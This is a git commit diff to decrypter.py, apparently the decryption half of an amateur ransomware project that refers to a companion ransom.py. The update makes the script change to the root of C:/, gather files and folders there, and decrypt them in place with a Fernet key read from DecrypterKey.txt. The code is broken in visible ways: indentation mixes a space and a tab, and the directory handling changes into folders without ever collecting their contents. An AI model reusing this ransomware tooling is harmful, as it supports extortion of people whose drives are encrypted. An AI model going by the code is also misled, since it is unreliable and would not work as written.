cc9b9b97323ca7f4b33d28fd82d6e31487975f8e
Deus <119631661+OldKokoroz@users.noreply.github.com>
2023-12-20 23:22:53 +0300

    Update decrypter.py

--- decrypter.py
+++ decrypter.py
@@ -4,21 +4,42 @@ import os
 from cryptography.fernet import Fernet
 
 files = []
+directories = []
+
+
+os.chdir("C:/")
+
 
 for file in os.listdir():
-	if file == "ransom.py" or file == "generatedkey.key" or file == "ransomdecrypter.py":
+ 	if file == "ransom.py" or file == "decrypter.py":
 		continue  # do not encrypt the current file we are working with or the key
-	if os.path.isfile(file):
+
+	elif os.path.isfile(file):
 		files.append(file)  # do not add if this is a directory, only if a file
 
-print(files)
+	elif os.path.isdir(file):
+		directories.append(file)
 
-with open("generatedkey.key", "rb") as generatedkey:
-	secret_key = generatedkey.read()
+
+for dirs in directories:
+	if dirs == "ransom.py" or dirs == "decrypter.py":
+		continue  # do not encrypt the current file we are working with or the key
+
+	elif os.path.isfile(dirs):
+		files.append(dirs)
+
+	elif os.path.isdir(dirs):
+		os.chdir(dirs)
+
+
+with open("DecrypterKey.txt", "r") as KeyCode:
+	secret_key = KeyCode.read()
 
 for file in files:
 	with open(file, "rb") as the_file:
 		contents = the_file.read()
+		
 	contents_decrypted = Fernet(secret_key).decrypt(contents)
+	
 	with open(file, "wb") as the_file:
 		the_file.write(contents_decrypted)
